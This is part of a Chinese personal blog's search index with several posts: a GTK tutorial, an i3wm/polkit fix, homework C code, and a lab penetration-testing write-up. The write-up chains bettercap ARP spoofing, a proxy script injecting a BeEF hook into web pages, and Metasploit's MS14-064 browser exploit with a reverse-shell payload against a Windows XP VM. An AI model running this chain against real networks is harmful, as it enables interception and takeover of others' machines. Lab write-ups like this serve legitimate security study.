","date":"2021-04-09","objectID":"/zh-cn/posts/%E5%AD%A6gtk%E8%AE%B0/:1:0","tags":["C语言","GTK","编程","随记"],"title":"学 GTK 记","uri":"/zh-cn/posts/%E5%AD%A6gtk%E8%AE%B0/"},{"categories":["编程"],"content":"gtk.h 要写 gtk 程序， 首先得导入这个库， 不过它得在安装 gtk 之后才行。 并且编译的时候还要加一些参数.. ","date":"2021-04-09","objectID":"/zh-cn/posts/%E5%AD%A6gtk%E8%AE%B0/:2:0","tags":["C语言","GTK","编程","随记"],"title":"学 GTK 记","uri":"/zh-cn/posts/%E5%AD%A6gtk%E8%AE%B0/"},{"categories":["编程"],"content":"安装 gtk 现在已经 gtk 已经更新到 4 了， 不过我这里用的是 3.. 这边 Arch 的话， 直接装上就好。 $ sudo pacman -S gtk3 ","date":"2021-04-09","objectID":"/zh-cn/posts/%E5%AD%A6gtk%E8%AE%B0/:2:1","tags":["C语言","GTK","编程","随记"],"title":"学 GTK 记","uri":"/zh-cn/posts/%E5%AD%A6gtk%E8%AE%B0/"},{"categories":["编程"],"content":"头文件 然后在程序的开头写上这个就可以开始编程了。 #include \u003cgtk/gtk.h\u003e ","date":"2021-04-09","objectID":"/zh-cn/posts/%E5%AD%A6gtk%E8%AE%B0/:2:2","tags":["C语言","GTK","编程","随记"],"title":"学 GTK 记","uri":"/zh-cn/posts/%E5%AD%A6gtk%E8%AE%B0/"},{"categories":["编程"],"content":"构建一个空白窗口 C 可能稍微比较复杂， 在它能够加载出窗口之前， 我们需要在主函数里定义两个参数… 我也不太懂， 就当作标准格式了。 一个是 整型(int) 的， 命名为 argc: int main(int argc, ) 另一个是 char 类型的, 命名为 argv, 但是这个有所不同， 我们得这么写 “char *argv” : int main(int argc, char *argv[]) 接下来写上大括号，我们就可以开始写了 #include \u003cgtk/gtk.h\u003e int main(int argc, char *argv[]) { } 首先我们要进行的是让 gtk 初始化 gtk_init(\u0026argc, \u0026argv); 写入这两个参数， 记得前面变量要加 \u0026, 这个似乎是指针吧.. 还是什么.. 呜呜呜， C 学得不怎么好… 好啦我们继续.. 就这样写在**主函数(main)**里面 #include \u003cgtk/gtk.h\u003e int main(int argc, char *argv[]) { gtk_init(\u0026argc, \u0026argv); } \";\" 这个一定不能丢！！ 别问为什么！ 如果你不写 \";\" 能把 C 语言程序跑起来, 我就一口气喝1L的肥宅快乐水 然后我们需要创建一个窗口 GtkWidget *window = gtk_window_new(GTK_WINDOW_TOPLEVEL); *window 为控件名称， 后面是 gtk.h 里面的函数， 没错， 就是像这样的调用，但是很长。 你也可以把 *window 写成别的， 只要你接下来输对了就可以.. 那么接下来我们的代码变成了这样 #include \u003cgtk/gtk.h\u003e int main(int argc, char *argv[]) { gtk_init(\u0026argc, \u0026argv); GtkWidget *window = gtk_window_new(GTK_WINDOW_TOPLEVEL); } 然后我们要让窗口显示出来， 需要写入这行 gtk_widget_show_all(window); 以及这行， 让 gtk 完全启动 gtk_main(); 最后我们加上 return 0; 完整代码变成了这样: #include \u003cgtk/gtk.h\u003e int main(int argc, char *argv[]) { gtk_init(\u0026argc, \u0026argv); GtkWidget *window = gtk_window_new(GTK_WINDOW_TOPLEVEL); gtk_widget_show_all(window); gtk_main(); return 0; } 然后我们得编译了， 上面提到过编译要写一长串 首先要 cd 到代码文件所在的位置， 然后敲这些 $ gcc -o test $(pkg-config --cflags --libs gtk+-3.0) 文件名.c 文件名.c 改为你的代码文件名， test 也可以改为你需要命名的名称 如果没有任何报错，那么大概是编译成功了 接下来在终端敲 $ ./test 一个 gtk 窗口程序就此诞生了! 不过它需要使用 CTRL + C 来结束， 因为此时只是一个外观的渲染， 窗口按钮是无效的。 接下来你可以添加更多的细节，一切可以参考 gtk 官方文档.. 以及我这里也写了个实例可以参考。 也是瞎捏的 GitHub - Aozaki-Club/about-doggy ","date":"2021-04-09","objectID":"/zh-cn/posts/%E5%AD%A6gtk%E8%AE%B0/:3:0","tags":["C语言","GTK","编程","随记"],"title":"学 GTK 记","uri":"/zh-cn/posts/%E5%AD%A6gtk%E8%AE%B0/"},{"categories":["编程"],"content":"总结 总体上来讲它似乎并不是特别的难.. 就是太长了.. 上文写的可能看不出来它有多长， 但是真正控件多了的时候就… 不过我还是会试着继续学的。 ","date":"2021-04-09","objectID":"/zh-cn/posts/%E5%AD%A6gtk%E8%AE%B0/:4:0","tags":["C语言","GTK","编程","随记"],"title":"学 GTK 记","uri":"/zh-cn/posts/%E5%AD%A6gtk%E8%AE%B0/"},{"categories":["编程"],"content":"参考链接 The GTK Project - A free and open-source cross-platform widget toolkit C语言也能做界面：踏上GTK+学习之旅_秋叶原 \u0026\u0026 Mike || 麦克-CSDN博客_c语言gtk GTK+ 3 Reference Manual: GTK+ 3 Reference Manual GtkWindow: GTK+ 3 Reference Manual ","date":"2021-04-09","objectID":"/zh-cn/posts/%E5%AD%A6gtk%E8%AE%B0/:5:0","tags":["C语言","GTK","编程","随记"],"title":"学 GTK 记","uri":"/zh-cn/posts/%E5%AD%A6gtk%E8%AE%B0/"},{"categories":["渗透测试"],"content":"先利用 bettercap 绑定 beef 的钩子以劫持浏览器，再用 beef 劫持的浏览器促使用户执行 payload.","date":"2021-02-02","objectID":"/zh-cn/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/","tags":["beef","bettercap","Linux","metasploit","笔记","渗透测试","ARP 欺骗","黑客"],"title":" Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试","uri":"/zh-cn/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["渗透测试"],"content":"序 嗯… 惯例是要先说点废话嘛.. 今天试着把 beef 和 bettercap 串在一起用了，发现有奇效～ 然后如果是 IE 浏览器的话，可以用 beef 配合 msf 的 ms14-064 模块获取系统权限～ 不多说啦，我们开始～ ","date":"2021-02-02","objectID":"/zh-cn/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:1:0","tags":["beef","bettercap","Linux","metasploit","笔记","渗透测试","ARP 欺骗","黑客"],"title":" Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试","uri":"/zh-cn/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["渗透测试"],"content":"测试环境 啊咧，先说说测试环境。 攻击机 Arch Linux 192.168.101.15 靶机 Windows XP on VirtualBox 192.168.101.43 条件有限，就只能用 XP 啦～ ","date":"2021-02-02","objectID":"/zh-cn/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:1:1","tags":["beef","bettercap","Linux","metasploit","笔记","渗透测试","ARP 欺骗","黑客"],"title":" Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试","uri":"/zh-cn/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["渗透测试"],"content":"用到的工具 bettercap 首先就是它啦～ 这是用来进行 ARP 欺骗的，可以进行 DNS 劫持和断网攻击，也就是常说的中间人攻击的一部分吧… beef 用来劫持浏览器… 然后可以干很多事情，具体的也不是很了解呢。 msf 这个就是老朋友啦～ 什么? nmap? 这次用不着哦～ ","date":"2021-02-02","objectID":"/zh-cn/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:1:2","tags":["beef","bettercap","Linux","metasploit","笔记","渗透测试","ARP 欺骗","黑客"],"title":" Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试","uri":"/zh-cn/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["渗透测试"],"content":"测试过程 首先是打开 bettercap $ sudo bettercap 然后我们会看到这样的返回结果.. 注意：这里需要加 sudo , 因为它要调用网卡这样的硬件，需要 root 权限，如果不加 sudo 的话，会得到这样的提示。 然后设置 arp 欺骗的目标： set arp.spoof.targets 192.168.101.43 这里设置的 targets 是靶机的地址哦 接下来启动 beef ，和上面说的一样要加 sudo 。 $ sudo beef 得到返回： 那么来说说终端里显示的这几个链接 Hook URL: http://192.168.101.15:3000/hook.js 这个就是上面所说的钩子地址了，浏览器一旦访问了带这些js的页面就会被 beef 勾住～ 一会儿我们要把它写进一个攻击脚本里～ UI URL: http://192.168.101.15:3000/ui/panel 这个就是我们的 beef 操作页面了打开以后会有个登录页面，像封面那样，登录进去之后是这样的。 关于用户名和密码是什么，这里就得提到，有些系统下的 beef 不能使用默认的用户名密码登录（beef:beef），甚至不能启动，比如我的 Arch 就会这样。 [14:40:25][!] ERROR: Default username and password in use! [14:40:25] |_ Change the beef.credentials.passwd in config.yaml 这个时候你需要做的是修改 config.yaml 这个文件中的用户名和密码，我的位置在 /usr/share/beef/config.yaml 改成这样 beef: version: '0.5.0.0-alpha-pre' # More verbose messages (server-side) debug: false # More verbose messages (client-side) client_debug: false # Used for generating secure tokens crypto_default_value_length: 80 # Credentials to authenticate in BeEF. # Used by both the RESTful API and the Admin interface credentials: user: \"随便起个名字\" passwd: \"随便想个密码\" 然后你就可以启动了，登录的时候用的就是你设置的用户名个密码。 好了，话不多说，我们继续。 接下来我们要做的是写一个 js 脚本，给 bettercap 用。 function onResponse(req,res){ if(res.ContentType.indexOf('text/html')==0){ var body=res.ReadBody(); if(body.indexOf('\u003c/head\u003e')!=-1){ res.Body=body.replace( '\u003c/head\u003e', '\u003cscript type=\"text/javascript\" src=\"http://192.168.101.15:3000/hook.js\"\u003e\u003c/script\u003e\u003c/head\u003e' ); } } } 将这个文件保存到你知道的目录，我将它保存到 /home/weepingdogel/Downloads/hack/192.168.101.43/hack.js 然后我们回到 bettercap，设置 http.proxy.script 这个参数为上面这个路径： set http.proxy.script /home/weepingdogel/Downloads/hack/192.168.101.43/hack.js 然后依次启动 net.probe、arp.spoof、http.proxy net.probe on arp.spoof on http.proxy on 嗯… 接下来就启动好了… 然后我们让靶机打开浏览器，打开一个网页… IE8 已经不支持 bing 的 https 了，所以一打开就上钩了.. 然后我们能做的事情就很多了 我决定使用内个 clippy 的模块，绑定一个 ms14-064 的地址，现在轮到 msf 出场了。 $ msfconsole 启用模块 use exploit/windows/browser/ms14_064_ole_code_execution 看看模块的描述 info Description: This module exploits the Windows OLE Automation array vulnerability, CVE-2014-6332. The vulnerability is known to affect Internet Explorer 3.0 until version 11 within Windows 95 up to Windows 10, and no patch for Windows XP. However, this exploit will only target Windows XP and Windows 7 box due to the Powershell limitation. Windows XP by defaults supports VBS, therefore it is used as the attack vector. On other newer Windows systems, the exploit will try using Powershell instead. 机翻一下就是： 该模块利用Windows OLE自动化阵列漏洞，CVE-2014-6332。已知该漏洞会影响Windows 95至Windows 10内的Internet Explorer 3.0直到11版本，Windows XP没有补丁。不过，由于Powershell的限制，这个漏洞只会针对Windows XP和Windows 7盒子。Windows XP默认支持VBS，因此它被用作攻击载体。在其他较新的Windows系统上，该漏洞将尝试使用Powershell代替。 看看设置 show options Module options (exploit/windows/browser/ms14_064_ole_code_execution): Name Current Setting Required Description ---- --------------- -------- ----------- AllowPowershellPrompt false yes Allow exploit to try Powershell Retries true no Allow the browser to retry the module SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 8080 yes The local port to listen on. SSL false no Negotiate SSL for incoming connections SSLCert no Path to a custom SSL certificate (default is randomly generated) TRYUAC false yes Ask victim to start as Administrator URIPATH no The URI to use for this exploit (default is random) Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: '', seh, thread, process, none) LHOST 192.168.101.15 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Windows XP 一般来讲我们只需要设置一个 SRVHOST 就可以了，但是刚刚 bettercap 把 8080 端口给占用了，因此我们需要重新设置一个 SRVPORT。 SRVHOST 设置为攻击机的地址 set SRVHOST 192.168.101.15 SRVPORT 任意指定一个空闲的端口 set SRVPORT 9999 执行 exploit 接下来我们得到了 [*] Exploit running as background job","date":"2021-02-02","objectID":"/zh-cn/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:2:0","tags":["beef","bettercap","Linux","metasploit","笔记","渗透测试","ARP 欺骗","黑客"],"title":" Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试","uri":"/zh-cn/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["渗透测试"],"content":"结尾 呼~ 写完了.. qwq 不过要声明一下，本文内容仅限于测试学习使用，别拿去干坏事，否则后果自负哦～ 最后，本站遵循 CC-BY-NC 4.0 协议，转载请注明出处 ","date":"2021-02-02","objectID":"/zh-cn/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:3:0","tags":["beef","bettercap","Linux","metasploit","笔记","渗透测试","ARP 欺骗","黑客"],"title":" Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试","uri":"/zh-cn/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["渗透测试"],"content":"参考链接 CVE-2014-6332 : OleAut32.dll in OLE in Microsoft Windows Server 2003 SP2, Windows Vista SP2, Windows Server 2008 SP2 and R2 SP1, Windows Microsoft Security Bulletin MS14-064 - Critical | Microsoft Docs Microsoft Internet Explorer 11 - OLE Automation Array Remote Code Execution (1) - Windows remote Exploit Microsoft Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / PowerShell VirtualAlloc (MS14-064) - Windows remote Exploit IBM X-Force Researcher Finds Significant Vulnerability in Microsoft Windows CVE-2014-6332: it’s raining shells | forsec kali bettercap的使用 | UsstZt Bettercap2.6与beef的使用_请你吃橘子-CSDN博客 DeepL Translate ","date":"2021-02-02","objectID":"/zh-cn/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:4:0","tags":["beef","bettercap","Linux","metasploit","笔记","渗透测试","ARP 欺骗","黑客"],"title":" Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试","uri":"/zh-cn/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["问题解决"],"content":"由于没有安装 polkit 以及其相对的图形前端，导致没弹出密码输入窗口，无法挂载...","date":"2021-01-16","objectID":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3_gvfs_%E5%9C%A8_i3wm_%E4%B8%8B%E6%97%A0%E6%B3%95%E6%8C%82%E8%BD%BD%E7%9A%84%E9%97%AE%E9%A2%98/","tags":["polkit","Arch Linux","i3wm","gvfs","无法挂载"],"title":"如何解决 gvfs 在 i3wm 下无法挂载的问题","uri":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3_gvfs_%E5%9C%A8_i3wm_%E4%B8%8B%E6%97%A0%E6%B3%95%E6%8C%82%E8%BD%BD%E7%9A%84%E9%97%AE%E9%A2%98/"},{"categories":["问题解决"],"content":"序 呃… 前面其实没什么可以说的废话，就是出问题了嘛… 然后就去群里问了，弄好了，然后写一下怎么弄好的… 换 i3wm 了，然后使用文件管理器挂载别的分区的时候，突然弹出这个报错… 这个问题一般是缺包， 好吧其实就是少装了东西。 我们需要装的是 polkit 这个东西… 如果不知道它是啥的话，看 Arch Wiki 的这个页面。 Polkit - ArchWiki ","date":"2021-01-16","objectID":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3_gvfs_%E5%9C%A8_i3wm_%E4%B8%8B%E6%97%A0%E6%B3%95%E6%8C%82%E8%BD%BD%E7%9A%84%E9%97%AE%E9%A2%98/:1:0","tags":["polkit","Arch Linux","i3wm","gvfs","无法挂载"],"title":"如何解决 gvfs 在 i3wm 下无法挂载的问题","uri":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3_gvfs_%E5%9C%A8_i3wm_%E4%B8%8B%E6%97%A0%E6%B3%95%E6%8C%82%E8%BD%BD%E7%9A%84%E9%97%AE%E9%A2%98/"},{"categories":["问题解决"],"content":"解决过程 首先安装 polkit ， $ sudo pacman -S polkit 装完后，我们还需要安装其对应的图形前端。 如图，我们有很多可以选择。 我这里选择 Gnome 的，比较习惯.. 用 pacman 就可以装了， $ sudo pacman -S polkit-gnome 如果想用其他的，把 polkit-gnome 替换成其他包名即可。 但是装完还不行，还得设置启动项，原因？ 在这： If you are using a graphical environment, make sure that a graphical authentication agent is installed and autostarted on login. ——Arch Wiki 里写的 大意就是，如果你要用的话，得保持这个程序运行… 大概是这样吧，想看完整意思就去谷歌翻译吧.. 接下来我要做的是想办法启动… 其实我们在终端里直接输入 wiki 上对应的路径就可以用了 $ /usr/lib/polkit-gnome/polkit-gnome-authentication-agent-1 \u0026 但这样的话每次都要打一遍，反正我是觉得麻烦～ rua～ 所以要设置开机启动，一般是可以这样的.. 嘛… i3wm 的话，要参考这个文档了。 i3: i3 User’s Guide 接下来呢，我就直接编辑 ~/.config/i3/config 这个文件。 $ vim ~/.config/i3/config 然后在里面加入… # 登录时，启动 polkit-gnome exec --no-startup-id /usr/lib/polkit-gnome/polkit-gnome-authentication-agent-1 然后我就重启了。 嗯，可以用了。 然后我试着输入密码，敲下去之后… 嗯，又报错了.. 看英文就知道.. 这其实是另一个问题了.. 其实它 balabla 一大堆，只不过是 ntfs-3g 这个包我又忘了装而已啦.. $ sudo pacman -S ntfs-3g 然后就好了… 不过截图是我今晚截的.. ","date":"2021-01-16","objectID":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3_gvfs_%E5%9C%A8_i3wm_%E4%B8%8B%E6%97%A0%E6%B3%95%E6%8C%82%E8%BD%BD%E7%9A%84%E9%97%AE%E9%A2%98/:2:0","tags":["polkit","Arch Linux","i3wm","gvfs","无法挂载"],"title":"如何解决 gvfs 在 i3wm 下无法挂载的问题","uri":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3_gvfs_%E5%9C%A8_i3wm_%E4%B8%8B%E6%97%A0%E6%B3%95%E6%8C%82%E8%BD%BD%E7%9A%84%E9%97%AE%E9%A2%98/"},{"categories":["问题解决"],"content":"结尾 然后我就又可以快乐地使用 i3wm 啦～ ","date":"2021-01-16","objectID":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3_gvfs_%E5%9C%A8_i3wm_%E4%B8%8B%E6%97%A0%E6%B3%95%E6%8C%82%E8%BD%BD%E7%9A%84%E9%97%AE%E9%A2%98/:3:0","tags":["polkit","Arch Linux","i3wm","gvfs","无法挂载"],"title":"如何解决 gvfs 在 i3wm 下无法挂载的问题","uri":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3_gvfs_%E5%9C%A8_i3wm_%E4%B8%8B%E6%97%A0%E6%B3%95%E6%8C%82%E8%BD%BD%E7%9A%84%E9%97%AE%E9%A2%98/"},{"categories":["问题解决"],"content":"帮她写一次 qwq","date":"2020-12-02","objectID":"/zh-cn/posts/%E5%B8%AE%E5%81%9A%E5%A4%A7%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%9C%E4%B8%9A/","tags":["C 语言","作业","帮做","示例"],"title":"帮做大学计算机作业","uri":"/zh-cn/posts/%E5%B8%AE%E5%81%9A%E5%A4%A7%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%9C%E4%B8%9A/"},{"categories":["问题解决"],"content":"序 帮做作业 qwq… 我也好久没玩 C 语言了，试试看我会不会做 PS: 我这里是 Linux，运行方式可能不同，如果你是 Windows ，你得用编辑器来运行。 例如 Dev C++ 、 VS 2019 等。 ","date":"2020-12-02","objectID":"/zh-cn/posts/%E5%B8%AE%E5%81%9A%E5%A4%A7%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%9C%E4%B8%9A/:1:0","tags":["C 语言","作业","帮做","示例"],"title":"帮做大学计算机作业","uri":"/zh-cn/posts/%E5%B8%AE%E5%81%9A%E5%A4%A7%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%9C%E4%B8%9A/"},{"categories":["问题解决"],"content":"实验十一 实验十一 实验目的: 了解 C 程序设计思想 了解 C 程序设计框架 实验内容: 输入一个成绩，输出它的等级评分 这个很简单，我们需要列几个等级区间。 优秀 80 ~ 100 分 [80,100] 及格 60~79 分 [60,79] 不及格 60 以下 [0,60) 在代码中，我们可以直接用运算表达式来表达区间，例如： score \u003e= 80 \u0026\u0026 score \u003c= 100 然后我们用 if() 来判断成绩等级。 #include\u003cstdio.h\u003e int main(){ int score = 85; if(score \u003e= 80 \u0026\u0026 score \u003c= 100){ printf(\"成绩为优秀\"); }else if(score \u003e= 60 \u0026\u0026 score \u003c= 79){ printf(\"成绩为及格\"); }else if(score \u003e= 0 \u0026\u0026 score \u003c 60){ printf(\"成绩不及格\"); } } 接下来执行程序 输出如下： weepingdogel@WeepingDogel /tmp\u003e make test cc test.c -o test weepingdogel@WeepingDogel /tmp\u003e ./test 成绩为优秀⏎ 然后我们需要获取用户输入的成绩，像这样，使用 scanf() 函数获取用户输入的数据然后赋值给整型变量 score 。 #include\u003cstdio.h\u003e int main(){ int score; printf(\"输入你的成绩:\"); scanf(\"%d\",\u0026score); printf(\"%d\",score); } 接下来就是将这两段代码组合到一起。 完整代码如下： #include\u003cstdio.h\u003e int main(){ int score; printf(\"输入你的成绩:\"); scanf(\"%d\",\u0026score); if(score \u003e= 80 \u0026\u0026 score \u003c= 100){ printf(\"成绩为优秀\"); }else if(score \u003e= 60 \u0026\u0026 score \u003c= 79){ printf(\"成绩为及格\"); }else if(score \u003e= 0 \u0026\u0026 score \u003c 60){ printf(\"成绩不及格\"); } } 思路： 先用 scanf() 函数获取用户输入的成绩，再用 if() 进行比对，最后输出结果。 这是输出： weepingdogel@WeepingDogel /tmp\u003e make test cc test.c -o test weepingdogel@WeepingDogel /tmp\u003e ./test 输入你的成绩:99 成绩为优秀⏎ weepingdogel@WeepingDogel /tmp\u003e ./test 输入你的成绩:85 成绩为优秀⏎ weepingdogel@WeepingDogel /tmp\u003e ./test 输入你的成绩:60 成绩为及格⏎ weepingdogel@WeepingDogel /tmp\u003e ./test 输入你的成绩:59 成绩不及格⏎ ","date":"2020-12-02","objectID":"/zh-cn/posts/%E5%B8%AE%E5%81%9A%E5%A4%A7%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%9C%E4%B8%9A/:2:0","tags":["C 语言","作业","帮做","示例"],"title":"帮做大学计算机作业","uri":"/zh-cn/posts/%E5%B8%AE%E5%81%9A%E5%A4%A7%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%9C%E4%B8%9A/"},{"categories":["问题解决"],"content":"实验十二 实验十二 实验目的: 了解 C 程序设计思想 了解 C 程序设计框架 任务内容 要求编写一个先注册然后再登录的程序，输出格式如下图所示： -------------------------------------- 注册界面 请输入您的注册用户名: Ly 请输入您的注册密码: 123 恭喜您！注册成功！ -------------------------------------- -------------------------------------- 登录界面 请输入您的登录用户名: Ly 请输入您的登录密码: 123 登录成功！ -------------------------------------- -------------------------------------- 登录界面 请输入您的登录用户名: Ly 请输入您的登录密码: 1234 登录失败！ -------------------------------------- 定义 4 个变量，分别保存注册时的用户名、密码以及登录时的用户名、密码 使用 if ... else 语句完成用户名、密码的判断 … 怎么说呢.. 我连说都懒得说了… 跟上面一样，先用 scanf() 获取内容，然后赋值给变量再来判断… 噗！算了，上代码，不想解释.. #include\u003cstdio.h\u003e #include\u003cstring.h\u003e int main(){ /*定义4个变量，分别保存注册时的用户名、密码以及登录时的用户名、密码*/ char username_sign[40]; char password_sign[16]; char username_login[40]; char password_login[16]; /*定义4个变量，分别保存注册时的用户名、密码以及登录时的用户名、密码*/ printf(\"--------------------------------------\\n 注册界面\\n\"); printf(\"请输入您的注册用户名:\"); scanf(\"%s\", username_sign); printf(\"请输入您的注册密码:\"); scanf(\"%s\", password_sign); printf(\"恭喜您！注册成功！\"); printf(\"\\n--------------------------------------\"); /*先用 scanf() 获取内容*/ printf(\"\\n\\n--------------------------------------\\n 登录界面\\n\"); printf(\"请输入您的登录用户名:\"); scanf(\"%s\",username_login); printf(\"请输入您的登录密码:\"); scanf(\"%s\",password_login); /*使用 if ... else 语句完成用户名、密码的判断*/ /*这里用 strcmp() 函数*/ if(strcmp(username_login,username_sign) == 0 \u0026\u0026 strcmp(password_login,password_sign) == 0){ printf(\"登录成功！\"); }else{ printf(\"登录失败！\"); } printf(\"\\n--------------------------------------\"); } 不过值得一提的是，这个字符串的判断方法有所不同，它需要使用strcmp() 函数，大概是这样… if(strcmp(username_login,username_sign) == 0 \u0026\u0026 strcmp(password_login,password_sign) == 0){ printf(\"登录成功！\"); }else{ printf(\"登录失败！\"); } 它似乎会计算出一个数值，如果等于 0 就表示这两段字符串是一样的。大概就是这样。 看看输出吧… weepingdogel@WeepingDogel /tmp\u003e make test2 cc test2.c -o test2 weepingdogel@WeepingDogel /tmp\u003e ./test2 -------------------------------------- 注册界面 请输入您的注册用户名:Ly 请输入您的注册密码:123 恭喜您！注册成功！ -------------------------------------- -------------------------------------- 登录界面 请输入您的登录用户名:Ly 请输入您的登录密码:123 登录成功！ --------------------------------------⏎ weepingdogel@WeepingDogel /tmp\u003e ./test2 -------------------------------------- 注册界面 请输入您的注册用户名:Ly 请输入您的注册密码:123 恭喜您！注册成功！ -------------------------------------- -------------------------------------- 登录界面 请输入您的登录用户名:Ly 请输入您的登录密码:1234 登录失败！ --------------------------------------⏎ 做完了～ ","date":"2020-12-02","objectID":"/zh-cn/posts/%E5%B8%AE%E5%81%9A%E5%A4%A7%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%9C%E4%B8%9A/:3:0","tags":["C 语言","作业","帮做","示例"],"title":"帮做大学计算机作业","uri":"/zh-cn/posts/%E5%B8%AE%E5%81%9A%E5%A4%A7%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%9C%E4%B8%9A/"},{"categories":["问题解决"],"content":"结语 其实细节上还是涉及到一些我可能会粗心大意忘掉的东西，所以我不敢说 “就这？就这？” 不过，相对来说还是比较简单的… 嗯… ","date":"2020-12-02","objectID":"/zh-cn/posts/%E5%B8%AE%E5%81%9A%E5%A4%A7%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%9C%E4%B8%9A/:4:0","tags":["C 